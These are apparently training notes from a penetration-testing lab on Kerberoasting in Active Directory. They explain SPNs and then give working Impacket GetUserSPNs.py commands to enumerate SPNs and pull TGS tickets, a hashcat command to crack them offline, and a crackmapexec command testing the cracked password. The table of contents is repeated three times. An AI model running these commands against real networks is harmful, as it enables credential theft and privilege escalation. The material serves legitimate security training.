## Table of Contents

  - [Table of Contents](#Table\of\Contents)
  - [Table of Contents](#Table\of\Contents)
  - [Overview](#Overview)
    - [What is SPN?](#What\is\SPN?)
    - [Why is it Vulnerable?](#Why\is\it\Vulnerable?)
  - [Kerberoasting Attack Scenarios](#Kerberoasting\Attack\Scenarios)
  - [Tools for the Attack](#Tools\for\the\Attack)
  - [Efficacy of the Attack](#Efficacy\of\the\Attack)
- [Kerberoasting Attack](#kerberoasting\attack)
  - [Introduction](#Introduction)
  - [Using GetUserSPNs.py from Impacket](#Using\GetUserSPNs.py\from\Impacket)
    - [Installing Impacket](#Installing\Impacket)
    - [Listing Service Principal Names (SPNs)](#Listing\Service\Principal\Names\(SPNs))
      - [Example](#Example)
    - [Requesting TGS Tickets](#Requesting\TGS\Tickets)
      - [Example](#Example)
    - [Targeted TGS Request - Use `-request-user [USERNAME]` to pull TGS for a specific user account. #### Example](#Targeted\TGS\Request\-\Use\`-request-user\[USERNAME]`\to\pull\TGS\for\a\specific\user\account.\####\Example)
    - [Saving TGS to Output File - Use `-outputfile [FILENAME]` to save TGS to a file. #### Example](#Saving\TGS\to\Output\File\-\Use\`-outputfile\[FILENAME]`\to\save\TGS\to\a\file.\####\Example)
      - [Cracking the Ticket Offline with Hashcat](#Cracking\the\Ticket\Offline\with\Hashcat)
      - [Testing Authentication against a Domain Controller](#Testing\Authentication\against\a\Domain\Controller)

## Table of Contents

  - [Table of Contents](#Table\of\Contents)
  - [Overview](#Overview)
    - [What is SPN?](#What\is\SPN?)
    - [Why is it Vulnerable?](#Why\is\it\Vulnerable?)
  - [Kerberoasting Attack Scenarios](#Kerberoasting\Attack\Scenarios)
  - [Tools for the Attack](#Tools\for\the\Attack)
  - [Efficacy of the Attack](#Efficacy\of\the\Attack)
- [Kerberoasting Attack](#kerberoasting\attack)
  - [Introduction](#Introduction)
  - [Using GetUserSPNs.py from Impacket](#Using\GetUserSPNs.py\from\Impacket)
    - [Installing Impacket](#Installing\Impacket)
    - [Listing Service Principal Names (SPNs)](#Listing\Service\Principal\Names\(SPNs))
      - [Example](#Example)
    - [Requesting TGS Tickets](#Requesting\TGS\Tickets)
      - [Example](#Example)
    - [Targeted TGS Request - Use `-request-user [USERNAME]` to pull TGS for a specific user account. #### Example](#Targeted\TGS\Request\-\Use\`-request-user\[USERNAME]`\to\pull\TGS\for\a\specific\user\account.\####\Example)
    - [Saving TGS to Output File - Use `-outputfile [FILENAME]` to save TGS to a file. #### Example](#Saving\TGS\to\Output\File\-\Use\`-outputfile\[FILENAME]`\to\save\TGS\to\a\file.\####\Example)
      - [Cracking the Ticket Offline with Hashcat](#Cracking\the\Ticket\Offline\with\Hashcat)
      - [Testing Authentication against a Domain Controller](#Testing\Authentication\against\a\Domain\Controller)


## Table of Contents

1. [Overview](https://chat.openai.com/c/8edf0f8c-9293-46be-b9a8-8462483e1455#overview)
2. [Kerberoasting Attack Scenarios](https://chat.openai.com/c/8edf0f8c-9293-46be-b9a8-8462483e1455#kerberoasting-attack-scenarios)
3. [Tools for the Attack](https://chat.openai.com/c/8edf0f8c-9293-46be-b9a8-8462483e1455#tools-for-the-attack)
4. [Efficacy of the Attack](https://chat.openai.com/c/8edf0f8c-9293-46be-b9a8-8462483e1455#efficacy-of-the-attack)
5. [Performing the Attack from a Linux Host](https://chat.openai.com/c/8edf0f8c-9293-46be-b9a8-8462483e1455#performing-the-attack-from-a-linux-host)

---

## Overview

**Kerberoasting** is a technique used for lateral movement and privilege escalation in Active Directory (AD) environments. The attack targets accounts with Service Principal Names (SPNs).

### What is SPN?

SPN stands for **Service Principal Name**. It's a unique identifier that Kerberos uses to map a service instance to a service account.

### Why is it Vulnerable?

- Service accounts often have elevated privileges.
- Weak or reused passwords are commonly used for simplifying administration.

**Note**: Simply having a Kerberos ticket does not grant the ability to execute commands. However, the ticket is encrypted with the service account’s NTLM hash. Therefore, you can potentially obtain the cleartext password by performing an offline brute-force attack.

---

## Kerberoasting Attack Scenarios

Depending on your position in the network, this attack can be executed in various ways:

1. **From a non-domain joined Linux host**: Requires valid domain user credentials.
2. **From a domain-joined Linux host**: Requires root access and the keytab file.
3. **From a domain-joined Windows host**: Authenticated as a domain user or with a shell in the context of a domain account.
4. **As SYSTEM on a domain-joined Windows host**: Requires SYSTEM level access.
5. **From a non-domain joined Windows host**: Utilizing `runas /netonly`.

---

## Tools for the Attack

You can use multiple tools to execute this attack:

- **From Linux**: Impacket’s `GetUserSPNs.py`
- **From Windows**: A combination of `setspn.exe`, PowerShell, and Mimikatz, or tools like PowerView and Rubeus.

---

## Efficacy of the Attack

The success of the attack is not guaranteed and is influenced by various factors:

- Strength of passwords
- Level of privileges associated with the service accounts

You may gain full Domain Admin access or nothing at all. The risk level in your report should vary based on the outcome of the attack.


# Kerberoasting Attack

## Introduction
- Kerberoasting is a technique to extract service account credentials.
- Multiple methods exist to perform this attack from Linux and Windows hosts.

## Using GetUserSPNs.py from Impacket

### Installing Impacket
- Clone the Impacket repository.
- Install using `sudo python3 -m pip install .`

### Listing Service Principal Names (SPNs)
- Use `GetUserSPNs.py -dc-ip [DC IP] [DOMAIN/USER]` to list SPNs.
- Output includes SPN, username, group membership, password last set, etc.

#### Example
`$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend`


### Requesting TGS Tickets
- Use `-request` flag to pull TGS tickets for offline cracking.

#### Example
`$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request`
  
### Targeted TGS Request - Use `-request-user [USERNAME]` to pull TGS for a specific user account. #### Example

``$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev`

  
### Saving TGS to Output File - Use `-outputfile [FILENAME]` to save TGS to a file. #### Example

`$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs`

Here we've written the TGS ticket for the `sqldev` user to a file named `sqldev_tgs`. Now we can attempt to crack the ticket offline using Hashcat hash mode `13100`.

#### Cracking the Ticket Offline with Hashcat

  Cracking the Ticket Offline with Hashcat

```shell-session
gdxqpardo@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

#### Testing Authentication against a Domain Controller

  Testing Authentication against a Domain Controller

```shell-session
gdxqpardo@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```
